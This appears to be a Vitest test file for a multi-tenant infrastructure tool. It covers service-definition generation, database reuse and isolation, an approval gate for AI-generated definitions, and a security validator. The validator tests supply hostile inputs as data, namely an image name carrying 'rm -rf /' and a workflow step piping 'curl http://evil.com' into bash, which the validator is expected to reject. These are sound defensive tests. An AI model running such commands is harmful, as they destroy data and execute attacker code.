import { describe, it, expect, beforeAll } from 'vitest';
import { eq } from 'drizzle-orm';
import { db, schema } from '../src/db/index.js';
import { resourceRegistry } from '../src/modules/resources/resource.registry.js';
import { resourcePlanner } from '../src/modules/resources/resource.planner.js';
import { resourceManager } from '../src/modules/resources/resource.manager.js';
import { serviceDefinitionGenerator } from '../src/modules/resources/definitions/service.definition.generator.js';

describe('Dynamic Service Definitions & Autonomous Multi-Tenant Infrastructure (pov.txt)', () => {
  beforeAll(async () => {
    await db.delete(schema.serviceDefinitions).where(eq(schema.serviceDefinitions.serviceType, 'cassandra'));
  });

  describe('1. Dynamic Service Definition Generation (No Hardcoded TypeScript Adapters)', () => {
    it('should resolve and mount dynamic definitions for ClickHouse, Neo4j, and Kafka', async () => {
      const clickhouseDef = await serviceDefinitionGenerator.getOrGenerateDefinition({ serviceType: 'clickhouse' });
      expect(clickhouseDef.serviceType).toBe('clickhouse');
      expect(clickhouseDef.category).toBe('sql');
      expect(clickhouseDef.image).toContain('clickhouse');
      expect(clickhouseDef.connectionContract.envMappings.CLICKHOUSE_URL).toBeDefined();

      const neo4jDef = await serviceDefinitionGenerator.getOrGenerateDefinition({ serviceType: 'neo4j' });
      expect(neo4jDef.serviceType).toBe('neo4j');
      expect(neo4jDef.category).toBe('graph');
      expect(neo4jDef.connectionContract.envMappings.NEO4J_URI).toBeDefined();

      const kafkaDef = await serviceDefinitionGenerator.getOrGenerateDefinition({ serviceType: 'kafka' });
      expect(kafkaDef.serviceType).toBe('kafka');
      expect(kafkaDef.category).toBe('broker');
      expect(kafkaDef.connectionContract.envMappings.KAFKA_BROKERS).toBeDefined();
    });

    it('should dynamically research and generate a valid ServiceDefinition for an unfamiliar technology (e.g. Cassandra / Valkey)', async () => {
      const cassandraDef = await serviceDefinitionGenerator.getOrGenerateDefinition({
        serviceType: 'cassandra',
        contextHint: 'NoSQL distributed database',
      });

      expect(cassandraDef.serviceType).toBe('cassandra');
      expect(cassandraDef.category).toBe('nosql');
      expect(cassandraDef.defaultInternalPort).toBe(9042);
      expect(cassandraDef.securityPolicy.disallowPrivileged).toBe(true);
      expect(cassandraDef.securityPolicy.disallowHostMounts).toBe(true);
      expect(cassandraDef.connectionContract.envMappings.CASSANDRA_URL).toBeDefined();
      expect(cassandraDef.multiTenancy.supported).toBe(false);
      expect(cassandraDef.multiTenancy.isolationStrategy).toBe('dedicated_only');
      expect(cassandraDef.provenance.evidenceSources?.length).toBeGreaterThan(0);
      expect(cassandraDef.contentHash).toBeDefined();

      // Ensure it is stored in database as candidate
      const [stored] = await db
        .select()
        .from(schema.serviceDefinitions)
        .where(eq(schema.serviceDefinitions.serviceType, 'cassandra'));
      expect(stored).toBeDefined();
      expect(stored?.status).toBe('candidate');
    });

    it('should dynamically mount an adapter on-the-fly when resourceRegistry encounters a new technology', async () => {
      const adapter = await resourceRegistry.getOrResolveAdapter('qdrant');
      expect(adapter).toBeDefined();
      expect(adapter.type).toBe('qdrant');
      expect(adapter.defaultPort).toBe(6333);
      expect(resourceRegistry.listSupportedTypes()).toContain('qdrant');
    });
  });

  describe('2. User Flow from pov.txt: Application A (Postgres, Kafka, Neo4j) -> Application B (Postgres, MongoDB)', () => {
    it('should execute the exact Application A -> Application B multi-tenant workflow', async () => {
      const projA = `proj_app_a_${Date.now()}`;
      const projB = `proj_app_b_${Date.now()}`;

      await db.insert(schema.projects).values([
        {
          id: projA,
          name: 'Application A',
          slug: `app-a-${Date.now()}`,
          repoUrl: 'https://github.com/example/app-a',
          branch: 'main',
          createdAt: Date.now(),
          updatedAt: Date.now(),
        },
        {
          id: projB,
          name: 'Application B',
          slug: `app-b-${Date.now()}`,
          repoUrl: 'https://github.com/example/app-b',
          branch: 'main',
          createdAt: Date.now(),
          updatedAt: Date.now(),
        },
      ]);

      // --- STEP 1: Deploy Application A with dependencies: PostgreSQL, Kafka, Neo4j ---
      // A1: PostgreSQL (Plan & Execute)
      const planA_Pg = await resourcePlanner.evaluateRequirement({ type: 'postgres' });
      const execA_Pg = await resourcePlanner.executeDecision({
        decision: planA_Pg.decision,
        projectId: projA,
        requirement: { type: 'postgres' },
      });
      expect(execA_Pg.binding.credentials.DATABASE_URL).toBeDefined();

      // A2: Kafka (Plan & Execute via dynamic definition)
      const planA_Kafka = await resourcePlanner.evaluateRequirement({ type: 'kafka' });
      const execA_Kafka = await resourcePlanner.executeDecision({
        decision: planA_Kafka.decision,
        projectId: projA,
        requirement: { type: 'kafka' },
      });
      expect(execA_Kafka.binding.credentials.KAFKA_BROKERS).toBeDefined();

      // A3: Neo4j (Plan & Execute via dynamic definition)
      const planA_Neo4j = await resourcePlanner.evaluateRequirement({ type: 'neo4j' });
      const execA_Neo4j = await resourcePlanner.executeDecision({
        decision: planA_Neo4j.decision,
        projectId: projA,
        requirement: { type: 'neo4j' },
      });
      expect(execA_Neo4j.binding.credentials.NEO4J_URI).toBeDefined();

      // --- STEP 2: Deploy Application B with dependencies: PostgreSQL, MongoDB ---
      // B1: PostgreSQL -> Must REUSE Application A's existing PostgreSQL container on deploymind-net!
      const planB_Pg = await resourcePlanner.evaluateRequirement({ type: 'postgres' });
      expect(planB_Pg.decision.action).toBe('reuse');
      if (planB_Pg.decision.action === 'reuse') {
        expect(planB_Pg.decision.resourceId).toBe(execA_Pg.resourceId);
      }

      const execB_Pg = await resourcePlanner.executeDecision({
        decision: planB_Pg.decision,
        projectId: projB,
        requirement: { type: 'postgres' },
      });
      expect(execB_Pg.reused).toBe(true);
      expect(execB_Pg.resourceId).toBe(execA_Pg.resourceId);

      // Verify Application A and B have separate databases on the same container
      expect(execA_Pg.binding.databaseName).not.toBe(execB_Pg.binding.databaseName);
      expect(execA_Pg.binding.credentials.DATABASE_URL).not.toBe(execB_Pg.binding.credentials.DATABASE_URL);

      // B2: MongoDB -> Dynamically provisioned
      const planB_Mongo = await resourcePlanner.evaluateRequirement({ type: 'mongodb' });
      const execB_Mongo = await resourcePlanner.executeDecision({
        decision: planB_Mongo.decision,
        projectId: projB,
        requirement: { type: 'mongodb' },
      });
      expect(execB_Mongo.binding.credentials.MONGODB_URI).toBeDefined();

      // --- STEP 3: Verify Dependency Graph ---
      const depGraph = await resourceManager.getDependencyGraph();
      const pgDep = depGraph.find((g) => g.resourceId === execA_Pg.resourceId);
      expect(pgDep).toBeDefined();
      expect(pgDep?.tenants.length).toBeGreaterThanOrEqual(2);
      expect(pgDep?.tenants.some((t) => t.projectId === projA)).toBe(true);
      expect(pgDep?.tenants.some((t) => t.projectId === projB)).toBe(true);

      // --- STEP 4: Independent Lifecycles ---
      // Deprovision Application A's tenant
      await resourceManager.deprovisionTenant(projA, 'postgres');

      // Shared PostgreSQL container must still have Application B's tenant and stay alive!
      const remainingTenants = await db
        .select()
        .from(schema.resourceTenants)
        .where(eq(schema.resourceTenants.resourceId, execA_Pg.resourceId));

      expect(remainingTenants.some((t) => t.projectId === projB)).toBe(true);
      expect(remainingTenants.some((t) => t.projectId === projA)).toBe(false);
    });
  });

  describe('3. Dedicated Isolation Enforcement (Review Finding P1)', () => {
    it('should generate distinct unshared instance identities when dedicated isolation is requested', async () => {
      const proj1 = `proj_ded_1_${Date.now()}`;
      const proj2 = `proj_ded_2_${Date.now()}`;

      await db.insert(schema.projects).values([
        {
          id: proj1,
          name: 'Dedicated App 1',
          slug: `ded-app-1-${Date.now()}`,
          repoUrl: 'https://github.com/example/ded-1',
          branch: 'main',
          createdAt: Date.now(),
          updatedAt: Date.now(),
        },
        {
          id: proj2,
          name: 'Dedicated App 2',
          slug: `ded-app-2-${Date.now()}`,
          repoUrl: 'https://github.com/example/ded-2',
          branch: 'main',
          createdAt: Date.now(),
          updatedAt: Date.now(),
        },
      ]);

      const plan1 = await resourcePlanner.evaluateRequirement({
        type: 'postgres',
        isolationLevel: 'dedicated',
      });
      expect(plan1.decision.action).toBe('provision');

      const exec1 = await resourcePlanner.executeDecision({
        decision: plan1.decision,
        projectId: proj1,
        requirement: { type: 'postgres', isolationLevel: 'dedicated' },
      });
      expect(exec1.resourceId).toContain('_dedicated_');

      const plan2 = await resourcePlanner.evaluateRequirement({
        type: 'postgres',
        isolationLevel: 'dedicated',
      });
      expect(plan2.decision.action).toBe('provision');

      const exec2 = await resourcePlanner.executeDecision({
        decision: plan2.decision,
        projectId: proj2,
        requirement: { type: 'postgres', isolationLevel: 'dedicated' },
      });
      expect(exec2.resourceId).toContain('_dedicated_');

      // Assert that the two dedicated instances have distinct identities and connection URIs
      expect(exec1.resourceId).not.toBe(exec2.resourceId);
      expect(exec1.binding.connectionUri).not.toBe(exec2.binding.connectionUri);
    });
  });

  describe('4. Dynamic Definition Security & Reliability Hardening (Review Findings)', () => {
    it('should block candidate unfamiliar technology and provision dedicated instance only after approval', async () => {
      const projCassandra = `proj_cas_${Date.now()}`;
      await db.insert(schema.projects).values({
        id: projCassandra,
        name: 'Cassandra App',
        slug: `cas-app-${Date.now()}`,
        repoUrl: 'https://github.com/example/cassandra-app',
        branch: 'main',
        createdAt: Date.now(),
        updatedAt: Date.now(),
      });

      // Step 1: Candidate status blocks execution at policy boundary
      const unapprovedPlan = await resourcePlanner.evaluateRequirement({ type: 'cassandra' });
      expect(unapprovedPlan.decision.action).toBe('reject');
      if (unapprovedPlan.decision.action === 'reject') {
        expect(unapprovedPlan.decision.reason).toContain('candidate');
      }

      // Step 2: Operator reviews and approves definition
      const approvedDef = await serviceDefinitionGenerator.approveDefinition('cassandra');
      expect(approvedDef.status).toBe('approved');
      expect(approvedDef.contentHash).toBeDefined();

      // Step 3: Now planner evaluates approved definition and provisions dedicated instance
      const plan = await resourcePlanner.evaluateRequirement({ type: 'cassandra' });
      expect(plan.decision.action).toBe('provision');
      expect(plan.reasoning).toContain('does not support multi-tenant sharing');

      const exec = await resourcePlanner.executeDecision({
        decision: plan.decision,
        projectId: projCassandra,
        requirement: { type: 'cassandra' },
      });

      expect(exec.reused).toBe(false);
      expect(exec.binding.credentials.CASSANDRA_URL).toBeDefined();
    });

    it('should preserve exact symmetric tenant identifiers between provisioning and deprovisioning', async () => {
      const projSym = `proj_sym_${Date.now()}`;
      await db.insert(schema.projects).values({
        id: projSym,
        name: 'Symmetric App',
        slug: `sym-app-${Date.now()}`,
        repoUrl: 'https://github.com/example/sym-app',
        branch: 'main',
        createdAt: Date.now(),
        updatedAt: Date.now(),
      });

      const plan = await resourcePlanner.evaluateRequirement({ type: 'postgres' });
      const exec = await resourcePlanner.executeDecision({
        decision: plan.decision,
        projectId: projSym,
        requirement: { type: 'postgres' },
      });

      const [storedTenant] = await db
        .select()
        .from(schema.resourceTenants)
        .where(eq(schema.resourceTenants.projectId, projSym));

      expect(storedTenant).toBeDefined();
      expect(storedTenant?.databaseName).toBe(exec.binding.databaseName);
      expect(storedTenant?.username).toBe(exec.binding.username);

      // Deprovision should succeed idempotently
      await resourceManager.deprovisionTenant(projSym, 'postgres');

      const [deletedTenant] = await db
        .select()
        .from(schema.resourceTenants)
        .where(eq(schema.resourceTenants.projectId, projSym));

      expect(deletedTenant).toBeUndefined();
    });

    it('should scope tenant cleanup to exact resource so other service tenants for the same project remain intact', async () => {
      const projMulti = `proj_multi_${Date.now()}`;
      await db.insert(schema.projects).values({
        id: projMulti,
        name: 'Multi-Tenant Service App',
        slug: `multi-service-${Date.now()}`,
        repoUrl: 'https://github.com/example/multi-app',
        branch: 'main',
        createdAt: Date.now(),
        updatedAt: Date.now(),
      });

      // 1. Provision PostgreSQL tenant for project
      await resourceManager.provisionPostgresTenant(projMulti);

      // 2. Provision Redis tenant for the SAME project
      await resourceManager.provisionRedisTenant(projMulti);

      // Verify both tenant records exist in resourceTenants
      const initialTenants = await db
        .select()
        .from(schema.resourceTenants)
        .where(eq(schema.resourceTenants.projectId, projMulti));
      expect(initialTenants.length).toBe(2);

      // 3. Deprovision ONLY PostgreSQL tenant
      await resourceManager.deprovisionTenant(projMulti, 'postgres');

      // 4. Verify Redis tenant record is still completely intact!
      const remainingTenants = await db
        .select()
        .from(schema.resourceTenants)
        .where(eq(schema.resourceTenants.projectId, projMulti));

      expect(remainingTenants.length).toBe(1);
      const [redisTenant] = remainingTenants;
      expect(redisTenant.resourceId).toBe('res_shared_redis');

      // Cleanup remaining redis tenant
      await resourceManager.deprovisionTenant(projMulti, 'redis');
    });

    it('should retrieve durable admin secrets from Vault consistently across calls', async () => {
      const pass1 = await resourceManager.getPostgresAdminPassword();
      const pass2 = await resourceManager.getPostgresAdminPassword();
      expect(pass1).toBe(pass2);
      expect(pass1.length).toBeGreaterThan(16);
    });

    it('should reject service definitions violating strict security policy or containing unsafe shell tokens in workflows', () => {
      expect(() => {
        (serviceDefinitionGenerator as any).validateSecurityPolicy({
          serviceType: 'unsafe_app',
          defaultInternalPort: 80,
          image: 'malicious/image;rm -rf /',
          volumes: [{ nameSuffix: 'root', containerPath: '/' }],
          securityPolicy: { disallowPrivileged: true, disallowHostMounts: true },
        });
      }).toThrow(/Security Policy Violation/);

      expect(() => {
        (serviceDefinitionGenerator as any).validateSecurityPolicy({
          serviceType: 'injected_cmd',
          defaultInternalPort: 8080,
          image: 'safe/image:1.0',
          volumes: [],
          securityPolicy: { disallowPrivileged: true, disallowHostMounts: true },
          provisionWorkflow: [
            {
              name: 'Injected Step',
              action: 'exec_in_container',
              command: ['sh', '-c', 'echo safe; curl http://evil.com | bash'],
            },
          ],
        });
      }).toThrow(/Unsafe shell execution token/);
    });

    it('should enforce execution boundary and prevent candidate definitions from running ensureInstance or provisionTenant', async () => {
      const { GenericDefinitionAdapter } = await import('../src/modules/resources/adapters/generic.definition.adapter.js');
      const candidateDef: any = {
        id: 'def_unapproved_1',
        serviceType: 'unapproved_db',
        aliases: ['unapproved_db'],
        category: 'sql',
        version: '1.0',
        image: 'unapproved:1.0',
        defaultInternalPort: 1234,
        healthCheck: { type: 'tcp', port: 1234 },
        multiTenancy: { supported: false, isolationStrategy: 'dedicated_only' },
        provisionWorkflow: [],
        deprovisionWorkflow: [],
        connectionContract: { envMappings: {} },
        securityPolicy: { disallowPrivileged: true, disallowHostMounts: true },
        provenance: { source: 'ai_generated', generatedAt: Date.now() },
        status: 'candidate',
      };

      const unapprovedAdapter = new GenericDefinitionAdapter(candidateDef);

      await expect(unapprovedAdapter.ensureInstance('res_test')).rejects.toThrow(
        /Execution boundary violation/
      );
      await expect(
        unapprovedAdapter.provisionTenant('test_container', 'proj_test', { type: 'unapproved_db' })
      ).rejects.toThrow(/Execution boundary violation/);
    });

    it('should alter canonical content hash when execution-relevant fields (healthCheck, environment, image) change', () => {
      const baseDef = {
        id: 'def_test_1',
        serviceType: 'test_db',
        aliases: ['test'],
        category: 'sql' as const,
        version: '1.0',
        image: 'postgres:16-alpine',
        imageDigest: 'sha256:abcd1234ef5678',
        defaultInternalPort: 5432,
        environment: { DB_NAME: 'test' },
        volumes: [{ nameSuffix: 'data', containerPath: '/data' }],
        healthCheck: { type: 'tcp' as const, port: 5432 },
        multiTenancy: { supported: true, isolationStrategy: 'database_per_tenant' as const },
        provisionWorkflow: [],
        deprovisionWorkflow: [],
        connectionContract: { envMappings: { DB_URL: '${URI}' } },
        securityPolicy: { disallowPrivileged: true, disallowHostMounts: true },
        provenance: { source: 'builtin' as const, evidenceSources: ['doc1'] },
      };

      const baseHash = serviceDefinitionGenerator.computeCanonicalContentHash(baseDef);

      // 1. Changing health check port must alter hash
      const mutatedHealth = {
        ...baseDef,
        healthCheck: { type: 'tcp' as const, port: 5433 },
      };
      expect(serviceDefinitionGenerator.computeCanonicalContentHash(mutatedHealth)).not.toBe(baseHash);

      // 2. Changing environment must alter hash
      const mutatedEnv = {
        ...baseDef,
        environment: { DB_NAME: 'test', NEW_FLAG: '1' },
      };
      expect(serviceDefinitionGenerator.computeCanonicalContentHash(mutatedEnv)).not.toBe(baseHash);

      // 3. Changing image must alter hash
      const mutatedImage = {
        ...baseDef,
        image: 'postgres:17-alpine',
      };
      expect(serviceDefinitionGenerator.computeCanonicalContentHash(mutatedImage)).not.toBe(baseHash);

      // 4. Changing imageDigest must alter hash
      const mutatedDigest = {
        ...baseDef,
        imageDigest: 'sha256:99999999999999',
      };
      expect(serviceDefinitionGenerator.computeCanonicalContentHash(mutatedDigest)).not.toBe(baseHash);

      // 5. Canonical serialization is key-order independent
      const reorderedDef = {
        category: 'sql' as const,
        version: '1.0',
        serviceType: 'test_db',
        id: 'def_test_1',
        securityPolicy: { disallowHostMounts: true, disallowPrivileged: true },
        connectionContract: { envMappings: { DB_URL: '${URI}' } },
        multiTenancy: { isolationStrategy: 'database_per_tenant' as const, supported: true },
        deprovisionWorkflow: [],
        provisionWorkflow: [],
        healthCheck: { port: 5432, type: 'tcp' as const },
        volumes: [{ containerPath: '/data', nameSuffix: 'data' }],
        environment: { DB_NAME: 'test' },
        defaultInternalPort: 5432,
        imageDigest: 'sha256:abcd1234ef5678',
        image: 'postgres:16-alpine',
        aliases: ['test'],
        provenance: { evidenceSources: ['doc1'], source: 'builtin' as const },
      };
      expect(serviceDefinitionGenerator.computeCanonicalContentHash(reorderedDef)).toBe(baseHash);
    });

    it('should block planning and resolution when a service definition is rejected', async () => {
      await serviceDefinitionGenerator.rejectDefinition('cassandra');

      const plan = await resourcePlanner.evaluateRequirement({ type: 'cassandra' });
      expect(plan.decision.action).toBe('reject');
      if (plan.decision.action === 'reject') {
        expect(plan.decision.reason).toContain('rejected and forbidden');
      }
    });
  });
});
